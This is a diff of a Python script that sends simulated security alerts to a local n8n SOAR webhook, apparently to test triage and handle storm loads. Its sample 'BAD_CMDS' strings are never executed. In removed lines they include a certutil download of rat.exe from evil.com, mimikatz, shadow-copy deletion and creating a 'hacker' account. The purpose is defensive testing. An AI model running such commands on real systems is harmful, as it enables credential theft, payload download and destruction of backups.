@@ -1,111 +1,77 @@
 import os
 import requests
-import uuid
 import time
 import random
 import sys
 
-# Connect to the Bridge
-BRIDGE_URL = os.getenv("BRIDGE_URL", "http://soar-bridge:8000/alert")
+# --- CONFIGURATION ---
+# Use the "Test URL" from your n8n Webhook node screenshot.
+# Note: 'nif_n8n_soar' is the container name from your docker-compose.
+# If running THIS script inside a container: use http://nif_n8n_soar:5678/...
+# If running THIS script from your Windows terminal: use http://localhost:5678/...
+N8N_URL = os.getenv("N8N_URL", "http://localhost:5678/webhook/splunk-alert")
 
-# --- DATA POOLS FOR RANDOM GENERATION ---
-
+# --- DATA POOLS ---
 KNOWN_ASSETS = [
-    {"host": "dxb-sql-prod", "ip": "10.0.5.5", "type": "CRITICAL"},      # Case 1
-    {"host": "uae-cloud-gateway", "ip": "10.0.80.50", "type": "HIGH"},  # Case 2
-    {"host": "hr-desktop-user", "ip": "192.168.1.102", "type": "LOW"},  # Case 3
+    {"host": "dxb-sql-prod", "ip": "10.0.5.5"},
+    {"host": "uae-cloud-gateway", "ip": "10.0.80.50"},
+    {"host": "hr-desktop-user", "ip": "192.168.1.102"},
 ]
 
 RANDOM_ASSETS = [
     {"host": "mkt-laptop-01", "ip": "192.168.5.50"},
-    {"host": "dev-server-09", "ip": "172.16.0.99"},
-    {"host": "guest-wifi-user", "ip": "10.20.20.1"}
+    {"host": "dev-server-09", "ip": "172.16.0.99"}
 ]
 
-# MALICIOUS COMMANDS (Triggers: Highest/High -> Slack)
-BAD_CMDS = [
-    "powershell -enc JABzID0gTmV3LU9i...",
-    "mimikatz.exe privilege::debug",
-    "certutil.exe -urlcache -split -f http://evil.com/rat.exe",
-    "net user /add hacker Password123!",
-    "vssadmin delete shadows /all /quiet"
-]
+BAD_CMDS = ["mimikatz.exe", "powershell -enc JABzID...", "net user /add hacker"]
+GOOD_CMDS = ["curl -X POST https://api.backup.uae", "ping google.com"]
+SUS_CMDS = ["whoami /priv", "netstat -an"]
 
-# AUTHORIZED/BENIGN COMMANDS (Triggers: Archive or Low)
-GOOD_CMDS = [
-    "curl -X POST https://api.backup.uae -u system_service",
-    "ping google.com",
-    "chkdsk /f C:",
-    "update_agent.exe --status"
-]
-
-# SUSPICIOUS COMMANDS (Triggers: Medium -> Manual Review)
-SUS_CMDS = [
-    "whoami /priv",
-    "netstat -an | findstr 4444",
-    "powershell.exe -Command Get-Process",
-    "dir /S C:\\Users\\Administrator"
-]
-
-def generate_random_alert():
-    # 1. Flip a coin to choose the Scenario Type
-    # 20% Authorized (Backup), 40% Malicious, 40% Suspicious
-    scenario_type = random.choice(["SAFE", "BAD", "BAD", "SUS", "SUS"])
+def generate_payload():
+    scenario = random.choice(["SAFE", "BAD", "SUS"])
+    asset = random.choice(KNOWN_ASSETS + RANDOM_ASSETS)
     
-    # 2. Pick Asset (Mix of known criticals and randoms)
-    if scenario_type == "SAFE":
-        # Force the Gateway for the specific whitelist policy
-        asset = KNOWN_ASSETS[1] 
-        cmd = GOOD_CMDS[0] # The approved curl command
-        severity = "Info"
+    if scenario == "SAFE":
+        cmd, sev = random.choice(GOOD_CMDS), "Info"
+    elif scenario == "BAD":
+        cmd, sev = random.choice(BAD_CMDS), "High"
     else:
-        # Pick any asset
-        asset = random.choice(KNOWN_ASSETS + RANDOM_ASSETS)
-        
-        if scenario_type == "BAD":
-            cmd = random.choice(BAD_CMDS)
-            severity = "High"
-        else: # SUS
-            cmd = random.choice(SUS_CMDS)
-            severity = "Medium"
+        cmd, sev = random.choice(SUS_CMDS), "Medium"
 
-    payload = {
-        "event_id": str(uuid.uuid4()),
+    return {
         "hostname": asset['host'],
         "ip_address": asset['ip'],
         "command": cmd,
-        "severity": severity,
-        "description": f"AUTO-GEN {scenario_type} SIMULATION"
+        "severity": sev,
+        "scenario_type": scenario # Extra metadata for n8n logging
     }
-    return payload, scenario_type
 
-def start_stress_test(count):
-    print(f"\n[🚀] STARTING CONTINUOUS SIMULATION: {count} INCIDENTS\n")
-    print(f"Targeting: {BRIDGE_URL}")
-    print("--------------------------------------------------")
+def run_test(count):
+    # If count > 20, we enter "STORM TEST" (No sleep)
+    is_storm = count > 20
+    
+    print(f"\n[🚀] STARTING {'STORM' if is_storm else 'NORMAL'} TEST: {count} INCIDENTS")
+    print(f"Targeting n8n: {N8N_URL}")
+    print("-" * 50)
 
     for i in range(1, count + 1):
-        payload, s_type = generate_random_alert()
-        
-        print(f"\n[{i}/{count}] SENDING [{s_type}] from {payload['hostname']}...")
+        payload = generate_payload()
+        print(f"[{i}/{count}] Sending {payload['scenario_type']} from {payload['hostname']}...", end=" ", flush=True)
         
         try:
-            r = requests.post(BRIDGE_URL, json=payload, timeout=60)
+            r = requests.post(N8N_URL, json=payload, timeout=5)
             if r.status_code == 200:
-                print(f" > ✅ Jira Key: {r.json().get('ticket')}")
-                if "transitioned to ARCHIVED" in str(r.content):
-                    print(" > ♻️ SELF-HEALED (Archived)")
+                print("✅ SENT")
             else:
-                print(f" > 🔴 FAILED: {r.status_code}")
+                print(f"❌ FAILED ({r.status_code})")
         except Exception as e:
-            print(f" > ⚠️ TIMEOUT/ERROR: {e}")
+            print(f"⚠️ ERROR: {e}")
 
-        # RANDOM SLEEP to simulate real traffic variance (and protect API limits)
-        wait_time = random.randint(5, 12)
-        print(f"   (Waiting {wait_time}s for Analyst cooldown...)")
-        time.sleep(wait_time)
+        # If it's NOT a storm, sleep to simulate normal traffic
+        if not is_storm:
+            time.sleep(random.randint(2, 5))
+        # In a storm, we send as fast as possible!
 
 if __name__ == "__main__":
-    # Default to 10 incidents, or accept user input
-    total = int(sys.argv[1]) if len(sys.argv) > 1 else 10
-    start_stress_test(total)
+    total = int(sys.argv[1]) if len(sys.argv) > 1 else 5
+    run_test(total)
